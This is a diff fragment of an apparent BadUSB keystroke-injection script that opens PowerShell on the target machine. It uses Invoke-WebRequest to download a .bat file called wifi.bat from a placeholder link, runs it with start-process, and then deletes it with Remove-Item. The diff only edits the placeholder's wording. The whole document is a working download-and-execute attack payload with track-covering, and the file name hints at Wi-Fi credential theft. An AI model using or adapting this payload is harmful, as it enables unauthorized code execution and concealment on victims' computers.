@@ -5,7 +5,7 @@ STRING powershell
 DELAY 100
 ENTER
 DELAY 5000
-STRING Invoke-WebRequest -Uri <direct download link for your .bat files> -OutFile ~\Documents\wifi.bat; start-process ~\Documents\wifi.bat
+STRING Invoke-WebRequest -Uri <direct download link for your .bat file> -OutFile ~\Documents\wifi.bat; start-process ~\Documents\wifi.bat
 ENTER
 DELAY 15000
 STRING Remove-Item ~\Documents\wifi.bat
